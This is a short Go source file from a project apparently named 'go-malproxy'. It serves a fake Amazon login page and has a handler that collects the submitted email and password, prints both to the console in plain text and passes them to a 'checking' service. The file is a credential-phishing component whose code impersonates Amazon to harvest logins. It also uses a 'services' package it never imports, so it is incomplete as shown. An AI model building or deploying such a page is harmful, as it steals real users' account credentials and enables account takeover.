package handler

import (
	"fmt"
	"log"
	"net/http"

	"github.com/go-malproxy/server/templates"
)

func AmazonLoginHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/amazon-login
	templates.Executor.ExecuteTemplate(w, "amazon-login", nil)
}

func AmazonHandler(w http.ResponseWriter, r *http.Request) { // http://localhost:3333/amazon-login-info
	fmt.Println("method:", r.Method)
	fmt.Println("email", r.FormValue("email"))
	fmt.Println("password", r.FormValue("password"))
	email := r.FormValue("email")
	password := r.FormValue("password")
	err := services.CheckingTheIntegrityOfAmazonInformation(email, password)
	if err != nil {
		templates.Executor.ExecuteTemplate(w, "err", nil)
	}
	if err := services.CheckingContextContents(); err != nil {
		log.Fatal(err)
	}
	templates.Executor.ExecuteTemplate(w, "autogen_amazon_info", nil)
}